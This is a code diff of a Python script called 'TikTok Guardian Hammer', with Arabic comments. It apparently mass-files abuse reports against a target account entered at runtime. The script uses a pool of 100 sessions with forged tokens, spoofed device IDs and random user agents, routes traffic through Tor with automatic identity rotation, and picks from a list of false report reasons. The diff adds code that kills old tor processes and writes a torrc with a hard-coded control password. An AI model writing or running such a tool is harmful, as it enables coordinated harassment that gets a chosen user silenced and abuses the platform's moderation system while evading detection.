@@ -1,21 +1,25 @@
 #!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 """
-TikTok Guardian Hammer v3.0 - الإصدار المحسن
+TikTok Guardian Hammer v3.0 - شاملة الإعداد والتشغيل
 """
 
+import os
+import subprocess
+import time
 import requests
 import random
-import time
-import sys
-import os
-import re
 import hashlib
 import socket
-from threading import Lock
+import sys
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from fake_useragent import UserAgent  # type: ignore
-from typing import List, Dict, Optional
+from threading import Lock
+from fake_useragent import UserAgent
+
+# إعدادات أساسية
+TOR_PASSWORD = "Guardian2025!"
+TOR_DIR = os.path.expanduser("~/.tor")
+TORRC_PATH = os.path.join(TOR_DIR, "torrc")
 
 CONFIG = {
     "tor_socks": "socks5h://127.0.0.1:9050",
@@ -25,15 +29,40 @@ CONFIG = {
     "user_agent_types": ['mobile', 'desktop'],
     "safety_checks": {
         "max_retries": 2,
-        "ip_verify_urls": [
-            "https://api.ipify.org",
-            "https://icanhazip.com"
-        ]
-    },
-    "proxy_refresh_interval": 300
+        "ip_verify_urls": ["https://api.ipify.org", "https://icanhazip.com"]
+    }
 }
 
+# تجهيز إعدادات Tor
+def kill_old_tor():
+    subprocess.run(["pkill", "-f", "tor"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+    time.sleep(1)
 
+def generate_hashed_password(password: str) -> str:
+    result = subprocess.run(
+        ["tor", "--hash-password", password],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.PIPE,
+        text=True
+    )
+    return result.stdout.strip().split('\n')[-1]
+
+def write_torrc(hashed_pass: str):
+    os.makedirs(TOR_DIR, exist_ok=True)
+    config = f"""
+ControlPort 9051
+HashedControlPassword {hashed_pass}
+CookieAuthentication 1
+SocksPort 9050
+"""
+    with open(TORRC_PATH, "w") as f:
+        f.write(config.strip())
+
+def start_tor():
+    subprocess.Popen(["tor", "-f", TORRC_PATH])
+    time.sleep(5)
+
+# السكربت الرئيسي
 class AttackVectorPool:
     def __init__(self, pool_size=100):
         self.pool = [self._create_session() for _ in range(pool_size)]
@@ -51,7 +80,7 @@ class AttackVectorPool:
             return random.choice(self.pool)
 
     def _generate_headers(self):
-        device_id = f"LX{random.randint(int(1E15), int(9E15)):016d}"
+        device_id = f"LX{random.randint(int(1e15), int(9e15))}"
         return {
             'User-Agent': UserAgent().random,
             'X-Tt-Token': self._generate_fake_token(),
@@ -64,17 +93,14 @@ class AttackVectorPool:
         chars = "abcdef0123456789"
         return ''.join(random.choice(chars) for _ in range(32))
 
-
 class CyberLynxPro:
     def __init__(self):
-        self.ua = UserAgent()
         self.lock = Lock()
         self.session_pool = AttackVectorPool(pool_size=100)
         self.report_reasons = [
             "inappropriate", "harassment", "spam", "hate_speech",
             "dangerous_acts", "nudity", "violence", "false_info"
         ]
-        self.last_proxy_refresh = 0
 
     def test_proxy(self, session):
         try:
@@ -105,7 +131,7 @@ class CyberLynxPro:
     def renew_tor_identity(self):
         try:
             with socket.create_connection(("127.0.0.1", 9051)) as s:
-                s.send(b'AUTHENTICATE "your_tor_control_password"\r\n')
+                s.send(f'AUTHENTICATE "{TOR_PASSWORD}"\r\n'.encode())
                 s.send(b'SIGNAL NEWNYM\r\n')
                 s.send(b'QUIT\r\n')
         except Exception as e:
@@ -124,27 +150,22 @@ class CyberLynxPro:
             iteration += 1
             time.sleep(5)
 
-
-def is_tor_running():
-    try:
-        with socket.create_connection(("127.0.0.1", 9050), timeout=2):
-            return True
-    except:
-        return False
-
-
 if __name__ == "__main__":
-    TARGET = input(" :ﻑﺪﻬﺘﺴﻤﻟﺍ ﺏﺎﺴﺤﻟﺍ ﻢﺳﺍ ﻞﺧﺩﺃ")
+    # إعداد تور
+    print("[*] Preparing environment...")
+    kill_old_tor()
+    hashed = generate_hashed_password(TOR_PASSWORD)
+    write_torrc(hashed)
+    start_tor()
+    print("[+] Tor is up and running.")
 
+    # تشغيل الهجوم
     if sys.platform != 'linux':
         sys.exit("[ERROR] Android/Termux environment required")
 
-    if not is_tor_running():
-        os.system("tor &")
-        time.sleep(5)
-
+    target = input(" :ﻑﺪﻬﺘﺴﻤﻟﺍ ﺏﺎﺴﺤﻟﺍ ﻢﺳﺍ ﻞﺧﺩﺃ").strip()
     nexus = CyberLynxPro()
     try:
-        nexus.orchestrate_attack(TARGET)
+        nexus.orchestrate_attack(target)
     except KeyboardInterrupt:
-        print("\n[SHUTDOWN] Operation terminated by user")
+        print("\n[SHUTDOWN] Operation terminated by user.")
